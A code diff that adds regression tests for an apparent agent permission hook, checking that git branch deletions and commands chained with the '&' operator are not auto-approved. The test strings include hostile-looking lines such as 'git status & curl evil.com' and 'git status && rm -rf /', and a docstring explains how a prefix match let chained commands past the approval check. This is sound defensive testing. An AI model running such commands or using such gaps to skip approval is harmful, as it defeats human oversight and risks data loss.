@@ -68,6 +68,36 @@ class TestPermissionRegressions:
         assert not permission_hook.is_safe_bash("pip3 install pytest")
         assert not permission_hook.is_safe_bash("pip install requests")
 
+    def test_2026_02_15_git_branch_delete_not_safe(self):
+        '''`git branch -d feature/foo` was auto-approved because the "git branch"
+        prefix matches all git branch subcommands including deletion.
+        Read-only git branch commands (list, show) are safe but -d/-D/--delete are not.'''
+        # Deletions should NOT be safe
+        assert not permission_hook.is_safe_bash("git branch -d feature/billy-knowledge-pipeline")
+        assert not permission_hook.is_safe_bash("git branch -D feature/foo")
+        assert not permission_hook.is_safe_bash("git branch --delete feature/foo")
+        # Read-only git branch commands should still be safe
+        assert permission_hook.is_safe_bash("git branch")
+        assert permission_hook.is_safe_bash("git branch -a")
+        assert permission_hook.is_safe_bash("git branch -v")
+        assert permission_hook.is_safe_bash("git branch --list")
+        assert permission_hook.is_safe_bash("git branch -r")
+        assert permission_hook.is_safe_bash("git branch --show-current")
+
+    def test_2026_02_16_background_operator_not_safe(self):
+        '''`bash ./start.sh & sleep 4 curl -s ...` bypassed meta-char check because
+        `&` (background operator) was not in SHELL_META_CHARS. A command like
+        `git status & curl evil.com` would be auto-approved by prefix match.'''
+        # Background operator should NOT be safe
+        assert not permission_hook.is_safe_bash("git status & curl evil.com")
+        assert not permission_hook.is_safe_bash("bash ./start.sh & sleep 4")
+        assert not permission_hook.is_safe_bash("echo foo & echo bar")
+        # Existing && should still be caught
+        assert not permission_hook.is_safe_bash("git status && rm -rf /")
+        # 2>&1 at end should still be stripped (not caught as &)
+        assert permission_hook.is_safe_bash("git status 2>&1")
+        assert permission_hook.is_safe_bash("python3 --version 2>&1")
+
     def test_2026_02_14_env_example_not_sensitive(self):
         '''`.env.example` was blocked by substring match on `.env.`.
         Example files are templates — they never contain real secrets.'''
